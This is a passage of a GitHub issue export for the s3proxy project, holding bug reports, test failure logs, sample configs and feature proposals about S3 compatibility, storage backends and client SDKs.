  JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testPutByteSource:627->BaseBlobIntegrationTest.testPut:757->BaseBlobIntegrationTest.checkContentMetadata:769->BaseBlobIntegrationTest.checkCacheControl:785 expected:<""max-age=3600""> but was:<null>
  JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testPutInputStream:635->BaseBlobIntegrationTest.testPut:757->BaseBlobIntegrationTest.checkContentMetadata:769->BaseBlobIntegrationTest.checkCacheControl:785 expected:<""max-age=3600""> but was:<null>
  JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testPutMultipartByteSource:650->BaseBlobIntegrationTest.testPut:757->BaseBlobIntegrationTest.checkContentMetadata:769->BaseBlobIntegrationTest.checkCacheControl:785 expected:<""max-age=3600""> but was:<null>
  JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testPutMultipartInputStream:658->BaseBlobIntegrationTest.testPut:757->BaseBlobIntegrationTest.checkContentMetadata:769->BaseBlobIntegrationTest.checkCacheControl:785 expected:<""max-age=3600""> but was:<null>
org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest.testPutObject(org.gaul.s3proxy.JcloudsS3BlobIntegrationLiveTest)
  Run 1: JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testPutObject:585->BaseBlobIntegrationTest.checkContentMetadata:769->BaseBlobIntegrationTest.checkCacheControl:785 expected:<""max-age=3600""> but was:<null>
  Run 2: JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testPutObject:585->BaseBlobIntegrationTest.checkContentMetadata:769->BaseBlobIntegrationTest.checkCacheControl:785 expected:<""max-age=3600""> but was:<null>
  Run 3: JcloudsS3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testPutObject:585->BaseBlobIntegrationTest.checkContentMetadata:769->BaseBlobIntegrationTest.checkCacheControl:785 expected:<""max-age=3600""> but was:<null>


Tests run: 127, Failures: 17, Errors: 0, Skipped: 15

[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 03:05 min
[INFO] Finished at: 2016-03-24T15:17:21+00:00
[INFO] Final Memory: 37M/372M
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-surefire-plugin:2.19.1:test (default-test) on project s3proxy: There are test failures.
[ERROR]
[ERROR] Please refer to /opt/s3proxy/target/surefire-reports for the individual test results.
[ERROR] -> [Help 1]
[ERROR]
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR]
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException
The command '/bin/sh -c mvn package' returned a non-zero code: 1
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/133/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/133/comments,https://api.github.com/repos/gaul/s3proxy/issues/133/events,https://github.com/gaul/s3proxy/issues/133,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/132,140869306,MDExOlB1bGxSZXF1ZXN0NjI4NTM5MTA=,132,Add NullBlobStore,848247,closed,FALSE,NA,NA,1,2016-03-15T04:29:50Z,2017-03-09T06:57:09Z,2017-03-09T06:57:09Z,OWNER,NA,"This throws away all data during object creation and reconstructs it
with NUL bytes.  Clients can use this to test very large objects.
Fixes #131.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/132/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/132/comments,https://api.github.com/repos/gaul/s3proxy/issues/132/events,https://github.com/gaul/s3proxy/pull/132,https://api.github.com/repos/gaul/s3proxy/pulls/132
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/131,140549684,MDU6SXNzdWUxNDA1NDk2ODQ=,131,Add middleware to test extremely large files,848247,closed,FALSE,NA,NA,0,2016-03-14T01:03:39Z,2017-03-09T06:56:56Z,2017-03-09T06:56:56Z,OWNER,NA,"Some clients want to test extremely large objects, e.g., 10,000 part multi-part uploads.  Using the file system provider with the default S3 minimum 5 MB part size makes this prohibitive.  Instead S3Proxy could support a /dev/null mode which discards client PUTs and returns some deterministic result for GETs.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/131/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/131/comments,https://api.github.com/repos/gaul/s3proxy/issues/131/events,https://github.com/gaul/s3proxy/issues/131,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/130,140300232,MDU6SXNzdWUxNDAzMDAyMzI=,130,Provide mechanism to ignore unknown headers instead of issuing unsupported error,17789996,closed,FALSE,NA,NA,6,2016-03-11T21:48:19Z,2016-08-31T20:57:35Z,2016-03-13T06:18:48Z,NONE,NA,"I'd like to use s3proxy as a test environment for a client that will eventually work against S3. This client includes the ""x-amz-server-side-encryption"" header which currently results in an exception (with s3proxy):

`com.amazonaws.services.s3.model.AmazonS3Exception: A header you provided implies functionality that is not implemented.`

I could of course configure my client to not send the header depending on what backend it's working with at the time, however I'd rather that be transparent to the client. And given this is for testing purposes I'm OK with the data not actually being encrypted.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/130/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/130/comments,https://api.github.com/repos/gaul/s3proxy/issues/130/events,https://github.com/gaul/s3proxy/issues/130,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/129,139730981,MDU6SXNzdWUxMzk3MzA5ODE=,129,using google-cloud-storage for provider is significantly slower than s3,7120158,closed,FALSE,NA,NA,2,2016-03-09T23:16:22Z,2018-02-23T02:14:24Z,2018-02-23T02:14:24Z,NONE,NA,"For whatever reason, uploads using the native `google-cloud-storage` provider (and boto as the client) seem to be taking WAY longer than the `s3` provider (s3 provider but still actually using GCS). Not sure why this is but thought I should note it. Downloads are pretty much just as fast.

Using GCS with the `s3` provider:

```
(env)[cb@test-upload tests]$ time ./upload-local-s3-proxy.py out.csv
Uploading out-180.csv to bucket dabucket
..........
real    0m7.776s
user    0m0.771s
sys     0m0.335s
(env)[cb@test-upload tests]$ time ./download-local-s3-proxy.py out.csv
Downloading out-180.csv from bucket dabucket
..........
real    0m7.512s
user    0m0.981s
sys     0m0.569s
```

After switching s3proxy to use the `google-cloud-storage` provider:

```
(env)[cb@test-upload tests]$ time ./upload-local-s3-proxy.py out.csv
Uploading out-180.csv to bucket dabucket
..........
real    0m45.132s
user    0m0.762s
sys     0m0.316s
(env)[cb@test-upload tests]$ time ./download-local-s3-proxy.py out.csv
Downloading out-180.csv from bucket dabucket
..........
real    0m8.092s
user    0m1.009s
sys     0m0.618s
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/129/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/129/comments,https://api.github.com/repos/gaul/s3proxy/issues/129/events,https://github.com/gaul/s3proxy/issues/129,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/128,139659310,MDU6SXNzdWUxMzk2NTkzMTA=,128,Unable to use google-cloud-storage backend with boto client,7120158,closed,FALSE,NA,NA,4,2016-03-09T18:19:30Z,2016-03-12T07:10:24Z,2016-03-09T23:12:18Z,NONE,NA,"Hello, I hope I'm just missing something simple, but I cannot get s3proxy to work with google cloud storage on the backend and boto as a client.

Here is my s3proxy config file:

```
# Local proxy settings
s3proxy.authorization=aws-v2
s3proxy.identity=access
s3proxy.credential=secret
s3proxy.endpoint=http://127.0.0.1:7000

jclouds.provider=google-cloud-storage
jclouds.identity=<project #>-compute@developer.gserviceaccount.com
jclouds.credential=/home/me/gce-default.key
```

And here is my boto test script:

```
#!/usr/bin/env python

from boto import connect_s3
from boto.s3.connection import OrdinaryCallingFormat
from boto.s3.key import Key

import sys

s3 = connect_s3(aws_access_key_id = 'access',
    aws_secret_access_key = 'secret',
    host = '127.0.0.1', port = 7000, is_secure = False,
    calling_format = OrdinaryCallingFormat())

bucket_name = sys.argv[1]

bucket = s3.get_bucket(bucket_name)

filename = ""%s"" % sys.argv[2]
print 'Uploading %s to bucket %s' % (filename, bucket_name)

def percent_cb(complete, total):
  sys.stdout.write('.')
  sys.stdout.flush()

k = Key(bucket)
k.key = filename
k.set_contents_from_filename(filename, cb=percent_cb, num_cb=10)
```

This all works fine when I use the s3 provider like so:

```
s3proxy.authorization=aws-v2
s3proxy.identity=access
s3proxy.credential=secret
s3proxy.endpoint=http://127.0.0.1:7000

jclouds.provider=s3
jclouds.endpoint=https://storage.googleapis.com
jclouds.s3.virtual-host-buckets=false
jclouds.strip-expect-header=true
jclouds.identity=<hmac id>
jclouds.credential=<hmac secret>
jclouds.regions=us-east-1
```

...but I'd like to try the native google-cloud-storage backend to see if it's faster / works better.  Also, I'd like to understand how to set up a logback.xml file for use with s3proxy to see jclouds logging output like this: http://jclouds.apache.org/reference/logging/#configure.  I've tried setting -Dlogback.configurationFile=logback.xml but that didn't work.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/128/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/128/comments,https://api.github.com/repos/gaul/s3proxy/issues/128/events,https://github.com/gaul/s3proxy/issues/128,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/127,137682087,MDU6SXNzdWUxMzc2ODIwODc=,127,Support for node.js aws sdk?,7120158,closed,FALSE,NA,NA,6,2016-03-01T20:48:10Z,2016-03-02T16:03:55Z,2016-03-02T16:03:55Z,NONE,NA,"I finally got s3proxy working with both boto and spark and it's really quite cool.

I then tried the [node.js aws SDK](https://aws.amazon.com/sdk-for-node-js/) and it didn't work, regardless of whether I enabled authentication or not.

With auth turned off entirely:

```
$ node test_download.js
 { [CredentialsError: Missing credentials in config]
message: [Getter/Setter],
code: 'CredentialsError',
time: Tue Mar 01 2016 14:29:56 GMT-0600 (CST),
originalError:
 { message: 'Could not load credentials from any providers',
   code: 'CredentialsError',
   time: Tue Mar 01 2016 14:29:56 GMT-0600 (CST),
   originalError: { message: 'Unexpected token <' } } } 'CredentialsError: Missing credentials in config\n    at Object.parse (native)\n    at /home/jbuss/test_node_with_local_s3proxy/node_modules/aws-sdk/lib/metadata_service.js:115:38\n    at IncomingMessage.<anonymous> (/home/jbuss/test_node_with_local_s3proxy/node_modules/aws-sdk/lib/metadata_service.js:74:45)\n    at IncomingMessage.emit (events.js:117:20)\n    at _stream_readable.js:944:16\n    at process._tickDomainCallback (node.js:492:13)'
```

With auth enabled:

```
$ node test_download.js
{ [AccessDenied: AWS authentication requires a valid Date or x-amz-date header]
message: 'AWS authentication requires a valid Date or x-amz-date header',
code: 'AccessDenied',
region: null,
time: Tue Mar 01 2016 14:33:07 GMT-0600 (CST),
requestId: null,
extendedRequestId: null,
statusCode: 403,
retryable: false,
retryDelay: 15.363339916802943 } 'AccessDenied: AWS authentication requires a valid Date or x-amz-date header\n    at Request.extractError (/home/jbuss/test_node_with_local_s3proxy/node_modules/aws-sdk/lib/services/s3.js:327:35)\n    at Request.callListeners (/home/jbuss/test_node_with_local_s3proxy/node_modules/aws-sdk/lib/sequential_executor.js:105:20)\n    at Request.emit (/home/jbuss/test_node_with_local_s3proxy/node_modules/aws-sdk/lib/sequential_executor.js:77:10)\n    at Request.emit (/home/jbuss/test_node_with_local_s3proxy/node_modules/aws-sdk/lib/request.js:596:14)\n    at Request.transition (/home/jbuss/test_node_with_local_s3proxy/node_modules/aws-sdk/lib/request.js:21:10)\n    at AcceptorStateMachine.runTo (/home/jbuss/test_node_with_local_s3proxy/node_modules/aws-sdk/lib/state_machine.js:14:12)\n    at /home/jbuss/test_node_with_local_s3proxy/node_modules/aws-sdk/lib/state_machine.js:26:10\n    at Request.<anonymous> (/home/jbuss/test_node_with_local_s3proxy/node_modules/aws-sdk/lib/request.js:37:9)\n    at Request.<anonymous> (/home/jbuss/test_node_with_local_s3proxy/node_modules/aws-sdk/lib/request.js:598:12)\n    at Request.callListeners (/home/jbuss/test_node_with_local_s3proxy/node_modules/aws-sdk/lib/sequential_executor.js:115:18)'
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/127/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/127/comments,https://api.github.com/repos/gaul/s3proxy/issues/127/events,https://github.com/gaul/s3proxy/issues/127,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/126,136208040,MDU6SXNzdWUxMzYyMDgwNDA=,126,Add middleware to encrypt object data before sending to storage backend,848247,open,FALSE,NA,NA,3,2016-02-24T22:32:34Z,2017-05-25T23:08:26Z,NA,OWNER,NA,"This would enable data privacy on backends without encryption, e.g., Rackspace Cloud Files, as well as improve privacy on backends with it, e.g., Amazon S3, due to handling the private key in S3Proxy.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/126/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/126/comments,https://api.github.com/repos/gaul/s3proxy/issues/126/events,https://github.com/gaul/s3proxy/issues/126,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/125,135017071,MDExOlB1bGxSZXF1ZXN0NjAwMzE2NDQ=,125,Add EventualBlobStore,848247,closed,FALSE,NA,NA,1,2016-02-20T01:28:22Z,2016-03-02T01:24:52Z,2016-03-02T01:16:34Z,OWNER,NA,"This models eventually-consistent behavior.  This implementation uses
two buckets and with client writes going to the first bucket and reads
to the second.  Operations are replicated from the first to the second
with a variable delays.  A more complete implementation could flap
between the strongly- and eventually-consistent buckets and arbitrary
reorder operations which conclude with last-writer wins.  Fixes #65.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/125/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/125/comments,https://api.github.com/repos/gaul/s3proxy/issues/125/events,https://github.com/gaul/s3proxy/pull/125,https://api.github.com/repos/gaul/s3proxy/pulls/125
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/124,134428872,MDExOlB1bGxSZXF1ZXN0NTk3MjQ1MjI=,124,squid:S1941 - Variables should not be declared before they are relevant,16510076,closed,FALSE,NA,NA,1,2016-02-17T23:07:10Z,2016-03-18T03:58:13Z,2016-03-18T03:58:13Z,NONE,NA,"This pull request is focused on resolving occurrences of Sonar rule squid:S1941 - Variables should not be declared before they are relevant

You can find more information about the issue here: https://dev.eclipse.org/sonar/coding_rules#q=squid:S1941

Please let me know if you have any questions.

M-Ezzat
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/124/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/124/comments,https://api.github.com/repos/gaul/s3proxy/issues/124/events,https://github.com/gaul/s3proxy/pull/124,https://api.github.com/repos/gaul/s3proxy/pulls/124
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/123,134427755,MDExOlB1bGxSZXF1ZXN0NTk3MjM3Njk=,123,Provide Dockerfile,848247,closed,FALSE,NA,NA,3,2016-02-17T23:00:22Z,2016-07-02T06:50:11Z,2016-07-02T06:50:11Z,OWNER,NA,"Fixes #120.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/123/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/123/comments,https://api.github.com/repos/gaul/s3proxy/issues/123/events,https://github.com/gaul/s3proxy/pull/123,https://api.github.com/repos/gaul/s3proxy/pulls/123
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/122,132033479,MDU6SXNzdWUxMzIwMzM0Nzk=,122,BucketAlreadyOwnedByYou error on new install,735413,closed,FALSE,NA,NA,5,2016-02-08T01:33:34Z,2018-02-23T02:21:16Z,2018-02-23T02:19:57Z,NONE,NA,"Hi, I'm having issues getting beyond the readme in order to get it running.

s3proxy 1.4.0, commit `bb68ff5`

The only change to the default config in the readme is that I'm using port 9090 instead of 8080; i.e. my s3proxy.conf file is:

``` s3proxy.authorization=none
s3proxy.endpoint=http://127.0.0.1:9090
jclouds.provider=filesystem
jclouds.identity=identity
jclouds.credential=credential
jclouds.filesystem.basedir=/tmp/s3proxy
```

When running:

```
$ curl --request PUT http://localhost:9090/test
<?xml version=""1.0"" ?><Error><Code>BucketAlreadyOwnedByYou</Code><Message></Message><BucketName>test</BucketName><RequestId>4442587FB7D0A2F9</RequestId></Error>
```

Still looking into it but any help would be appreciated.

Thanks!
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/122/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/122/comments,https://api.github.com/repos/gaul/s3proxy/issues/122/events,https://github.com/gaul/s3proxy/issues/122,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/121,131832244,MDU6SXNzdWUxMzE4MzIyNDQ=,121,Java 8 dependency,848247,open,FALSE,NA,NA,3,2016-02-06T07:32:58Z,2019-02-05T18:21:56Z,NA,OWNER,NA,"S3Proxy requires Java 7 presently.  Requiring Java 8 would allow upgrading some dependencies:

- Checkstyle 7.0 http://checkstyle.sourceforge.net/releasenotes.html#Release_7.0
- error-prone 2.0.6 https://groups.google.com/forum/#!topic/error-prone-announce/ycJBeaNK3Uc
- Jetty 9.3 https://webtide.com/jetty-9-3-features/

These do not seem compelling and older distributions like Ubuntu 14.04 LTS do not provide Java 8.  Keeping this bug open for tracking.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/121/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/121/comments,https://api.github.com/repos/gaul/s3proxy/issues/121/events,https://github.com/gaul/s3proxy/issues/121,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/120,131586430,MDU6SXNzdWUxMzE1ODY0MzA=,120,Docker packaging,848247,closed,FALSE,NA,NA,4,2016-02-05T08:44:46Z,2016-07-02T06:50:11Z,2016-07-02T06:50:11Z,OWNER,NA,"I recently discovered five projects packaging S3Proxy for Docker:
- https://github.com/bn0ir/docker-s3proxy
- https://github.com/dweinstein/dockerfile-s3proxy
- https://github.com/joshdvir/dockers/tree/master/s3proxy
- https://github.com/ritazh/s3proxydocker
- https://github.com/stevemayne/s3proxydocker

I am happy that so many people find S3Proxy useful enough to package although wonder if we can point users to a canonical version.  I added a reference to one of them in #103 although do not have enough Docker background to understand if the README should promote this instance, another, or more than one.  Or should the main S3Proxy project include a Dockerfile and publish it to Docker Hub?

@bn0ir @dweinstein @joshdvir @ritazh @stevemayne What do you think?
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/120/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/120/comments,https://api.github.com/repos/gaul/s3proxy/issues/120/events,https://github.com/gaul/s3proxy/issues/120,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/119,131222445,MDU6SXNzdWUxMzEyMjI0NDU=,119,ListBucketResult differs from AWS S3,11239090,closed,FALSE,NA,NA,2,2016-02-04T02:42:57Z,2016-02-05T06:43:24Z,2016-02-05T06:43:24Z,NONE,NA,"s3proxy 1.4.0 (06ec55e4df9ca7677ea6c8cc45bf90df97004969)

config file:

```
s3proxy.endpoint=http://127.0.0.1:8080
s3proxy.authorization=aws-v2
s3proxy.identity=local-identity
s3proxy.credential=local-credential

jclouds.provider=transient
jclouds.identity=remote-identity
jclouds.credential=remote-credential
```

Create a bucket:
`curl -X PUT ""http://s3host/somebucket""`

Create an object named ""dir/""
`curl -X PUT ""http://s3host/somebucket/dir/"" -H ""Content-Length: 0""`

List the bucket with these query parameters:
`curl ""http://s3host/somebucket?delimiter=/&max-keys=1000&prefix=dir/""`

The result from AWS contains one key

```
  <ListBucketResult xmlns=""http://s3.amazonaws.com/doc/2006-03-01/"">
...
    <Contents>
      <Key>dir/</Key>
...
    </Contents>
  </ListBucketResult>
```

The result from S3Proxy contains no keys:

```
  <ListBucketResult xmlns=""http://s3.amazonaws.com/doc/2006-03-01/"">
  </ListBucketResult>
```

Create a second object:
`curl -X PUT ""http://s3host/somebucket/dir/file"" -H ""Content-Length: 0""`

The result from AWS contains two keys.

```
  <ListBucketResult xmlns=""http://s3.amazonaws.com/doc/2006-03-01/"">
...
    <Contents>
      <Key>dir/</Key>
...
      <Key>dir/file</Key>
...
    </Contents>
  </ListBucketResult>
```

The result from S3Proxy contain two keys, in a different order.

```
  <ListBucketResult xmlns=""http://s3.amazonaws.com/doc/2006-03-01/"">
...
    <Contents>
      <Key>dir/file</Key>
...
      <Key>dir/</Key>
...
    </Contents>
  </ListBucketResult>
```

The  [Amazon S3 spec is explicit about the AWS implementation returning keys alphabetically](http://docs.aws.amazon.com/AmazonS3/latest/API/RESTBucketGET.html)
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/119/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/119/comments,https://api.github.com/repos/gaul/s3proxy/issues/119/events,https://github.com/gaul/s3proxy/issues/119,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/118,130473940,MDU6SXNzdWUxMzA0NzM5NDA=,118,Listing multipart uploads,848247,closed,FALSE,NA,NA,3,2016-02-01T20:31:13Z,2016-06-24T05:08:03Z,2016-06-14T22:19:58Z,OWNER,NA,"S3Proxy should allow listing in-progress multipart uploads.  Clients use this operation to resume and abort MPU.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/118/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/118/comments,https://api.github.com/repos/gaul/s3proxy/issues/118/events,https://github.com/gaul/s3proxy/issues/118,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/117,128461096,MDU6SXNzdWUxMjg0NjEwOTY=,117,Add middleware to mirror write operations to two storage backends,848247,open,FALSE,NA,NA,3,2016-01-25T04:59:50Z,2018-02-23T02:18:13Z,NA,OWNER,NA,"S3Proxy can use jclouds `ForwardingBlobStore` to mirror write operations to two storage backends.  Failure to write to either store should fail the client request.  Note that this will leave the store in an inconsistent state that some external service needs to reconcile.  Servicing read operations should try the first backend first and fail over to the second on errors.

@dleute Related to your request in #93.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/117/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/117/comments,https://api.github.com/repos/gaul/s3proxy/issues/117/events,https://github.com/gaul/s3proxy/issues/117,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/116,126976362,MDU6SXNzdWUxMjY5NzYzNjI=,116,XML ACLs,848247,closed,FALSE,NA,NA,0,2016-01-15T23:01:10Z,2016-01-22T01:55:54Z,2016-01-22T01:55:54Z,OWNER,NA,"Presently S3Proxy supports public-read and private canned ACLs.  S3Proxy could also support the subset of XML ACLs which map onto these canned policies to ensure greater compatibility.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/116/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/116/comments,https://api.github.com/repos/gaul/s3proxy/issues/116/events,https://github.com/gaul/s3proxy/issues/116,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/115,126927645,MDU6SXNzdWUxMjY5Mjc2NDU=,115,Cache-Control header,848247,closed,FALSE,NA,NA,0,2016-01-15T18:16:22Z,2016-01-17T20:10:18Z,2016-01-17T20:10:18Z,OWNER,NA,"Needs upstream jclouds support, tracked by [JCLOUDS-948](https://issues.apache.org/jira/browse/JCLOUDS-948).
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/115/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/115/comments,https://api.github.com/repos/gaul/s3proxy/issues/115/events,https://github.com/gaul/s3proxy/issues/115,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/114,126770803,MDExOlB1bGxSZXF1ZXN0NTYxMDg5ODU=,114,Use uploadId for stub blob name,848247,closed,FALSE,NA,NA,1,2016-01-14T23:16:59Z,2016-01-23T20:04:36Z,2016-01-15T23:08:28Z,OWNER,NA,"This makes MPU overwrites of an existing blob atomic.  Fixes #108.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/114/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/114/comments,https://api.github.com/repos/gaul/s3proxy/issues/114/events,https://github.com/gaul/s3proxy/pull/114,https://api.github.com/repos/gaul/s3proxy/pulls/114
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/113,126303904,MDU6SXNzdWUxMjYzMDM5MDQ=,113,Conditional copy object,848247,closed,FALSE,NA,NA,0,2016-01-12T23:34:11Z,2016-02-17T21:28:42Z,2016-02-17T00:56:47Z,OWNER,NA,"S3Proxy should support conditional copy objects via `x-amz-copy-source-if-match`, `x-amz-copy-source-if-modified-since`, `x-amz-copy-source-if-none-match`, and `x-amz-copy-source-if-unmodified-since`.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/113/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/113/comments,https://api.github.com/repos/gaul/s3proxy/issues/113/events,https://github.com/gaul/s3proxy/issues/113,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/112,125506509,MDExOlB1bGxSZXF1ZXN0NTU0MDQzOTA=,112,Support AWS v4 signatures,848247,closed,FALSE,NA,NA,3,2016-01-07T23:13:19Z,2016-01-08T23:39:19Z,2016-01-08T23:32:52Z,OWNER,NA,"Fixes #24.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/112/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/112/comments,https://api.github.com/repos/gaul/s3proxy/issues/112/events,https://github.com/gaul/s3proxy/pull/112,https://api.github.com/repos/gaul/s3proxy/pulls/112
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/111,124880962,MDU6SXNzdWUxMjQ4ODA5NjI=,111,Multipart upload fails for Azure storage,1856066,closed,FALSE,NA,NA,9,2016-01-05T02:13:42Z,2016-01-06T02:47:19Z,2016-01-06T02:47:19Z,CONTRIBUTOR,NA,"This seems to be a recently introduced issue. Multipart upload against Azure used to work with `UploadPartRequest` and `TransferManager`. Now the individual parts seem to be uploaded successfully, but ends with:
`Error Code: 501 Not Implemented` from the SDK and `exceptions from GetContainerACL are parsed by NullOnContainerNotFound` from S3Proxy log.

S3 backend works as expected.

Will go through each commit since a5221f5. Let me know if you are aware of any change that may have caused this.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/111/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/111/comments,https://api.github.com/repos/gaul/s3proxy/issues/111/events,https://github.com/gaul/s3proxy/issues/111,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/110,124830828,MDU6SXNzdWUxMjQ4MzA4Mjg=,110,Unknown header x-amz-content-sha256,1856066,closed,FALSE,NA,NA,1,2016-01-04T20:21:09Z,2016-01-04T20:27:53Z,2016-01-04T20:27:53Z,CONTRIBUTOR,NA,"When using both AWS S3 and Azure storage as the storage backend with anonymous access, downloading a file caused an error: `Unknown header x-amz-content-sha256`. I believe this is related to #24 By default, the AWS S3 SDK seems to always use v4 signatures. Since S3Proxy does not yet support v4 signatures, is there a way around this?
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/110/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/110/comments,https://api.github.com/repos/gaul/s3proxy/issues/110/events,https://github.com/gaul/s3proxy/issues/110,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/109,123465023,MDU6SXNzdWUxMjM0NjUwMjM=,109,AWS CLI example on wiki not working for me,5993,closed,FALSE,NA,NA,2,2015-12-22T11:33:16Z,2015-12-22T19:44:04Z,2015-12-22T19:44:04Z,NONE,NA,"I follow the steps shown at https://github.com/andrewgaul/s3proxy/wiki/Client-compatibility-list and I get this:

```
:.aws $ aws configure
AWS Access Key ID [****************tity]: local-identity
AWS Secret Access Key [****************tial]: local-credential
Default region name [us-east-1]: None
Default output format [None]:
:.aws $ aws s3 ls --endpoint-url http://127.0.0.1:8080

A client error (InvalidArgument) occurred when calling the ListBuckets operation: Bad Request

:.aws $ aws --version
aws-cli/1.9.15 Python/2.7.6 Darwin/15.0.0 botocore/1.3.15
```

Am I doing something wrong, or is this a bug?
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/109/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/109/comments,https://api.github.com/repos/gaul/s3proxy/issues/109/events,https://github.com/gaul/s3proxy/issues/109,NA
